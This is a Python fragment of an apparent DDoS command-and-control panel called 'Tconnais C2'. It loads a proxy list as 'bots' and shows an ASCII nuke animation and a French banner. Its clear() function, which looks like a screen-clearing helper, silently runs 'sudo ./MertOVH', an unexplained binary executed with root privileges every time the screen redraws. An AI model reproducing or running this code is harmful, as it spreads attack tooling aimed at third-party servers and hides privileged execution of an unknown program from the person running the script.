import socket
import os
import requests
import random
import getpass
import time
import sys

def clear():
    os.system('sudo ./MertOVH')
    os.system('cls' if os.name == 'nt' else 'clear')
    
proxys = open('proxies.txt').readlines()
bots = len(proxys)

def ascii_vro():
    clear()
    print(f'''
     / **/|        
     | == /        
      |  |         
      |  |         
      |  /         
       |/  
    ''')
    time.sleep(0.6)
    clear()
    print(f'''
     / **/|        
     | == /        
      |  |         
      |  |         
      |  /         
       |/  
    ''')
    time.sleep(0.6)
    clear()
    print(f'''
     / **/|        
     | == /        
      |  |                  
    ''')
    time.sleep(0.6)
    clear()
    print(f"""
     _.-^^---....,,--       
 _--                  --_  
<                        >)
|                         | 
 \\._                   _./  
    ```--. . , ; .--'''       
          | |   |             
       .-=||  | |=-.   
       `-=#$%&%$#=-'   
          | ;  :|     
 _____.,-#%&$@%#&#~,._____
    """)
    time.sleep(0.8)
    clear()

def si():
    print('\x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233m1337 \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233mBienvenue sur Tconnais C2 \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mOwners: Tconnais1337 \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mMeilleurs C2')
    print("")
